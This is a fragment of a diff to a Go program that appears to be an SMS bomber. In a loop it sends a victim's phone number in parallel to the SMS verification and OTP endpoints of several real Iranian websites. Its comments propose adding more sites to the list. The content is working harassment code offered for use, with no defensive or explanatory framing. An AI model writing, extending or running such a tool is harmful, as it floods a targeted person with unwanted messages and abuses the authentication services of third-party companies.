@@ -109,13 +109,13 @@ func main() {
 	for i := 0; i < repeatCount; i++ {
 /////////////////////////////////////// site aparat should definitely be added.
 		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
-			"identifier": phone0,
+			"identifier": phone,
 		}, ch)   // add site
 		go sms("https://virgool.io/api/v1.4/auth/verify", map[string]interface{}{
-			"'method': 'phone', 'identifier'": phone0,
+			"'method': 'phone', 'identifier'": phone,
 		}, ch)
 		go sms("https://cyclops.drnext.ir/v1/patients/auth/send-verification-token", map[string]interface{}{
-			"mobile": phone0,
+			"mobile": phone,
 		}, ch) 
 		go sms("https://ebcom.mci.ir/services/auth/v1.0/otp", map[string]interface{}{
 			"msisdn": phone,
@@ -126,8 +126,6 @@ func main() {
 		go sms("https://my.mobinnet.ir/api/account/SendRegisterVerificationCode", map[string]interface{}{
 			"cellNumber": phone,
 		}, ch)
-
-		s38 := fmt.Sprintf("'phone_number':%s,'os_type':'W'", phone)
 		go sms("https://account.api.balad.ir/api/web/auth/login/", map[string]interface{}{
 			"phone_number": phone,
 		}, ch)  
